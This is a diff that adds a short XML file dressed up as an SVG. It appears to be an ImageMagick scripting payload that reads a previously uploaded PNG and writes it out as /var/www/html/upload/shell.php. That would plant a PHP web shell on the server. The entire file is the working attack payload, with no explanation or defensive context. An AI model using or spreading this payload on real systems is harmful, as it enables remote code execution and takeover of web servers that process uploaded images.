@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!-- <svg> -->
+<image>
+  <read filename="/var/www/html/upload/78a6301ff13ef58aa4241a8b185cc77e/cac214d14d05c5b7ebeac6a49c01b383.png" />
+  <write filename="/var/www/html/upload/shell.php" />
+  <svg width="120px" height="120px">
+    <image href="/var/www/html/upload/78a6301ff13ef58aa4241a8b185cc77e/cac214d14d05c5b7ebeac6a49c01b383.png" />
+  </svg>
+</image>
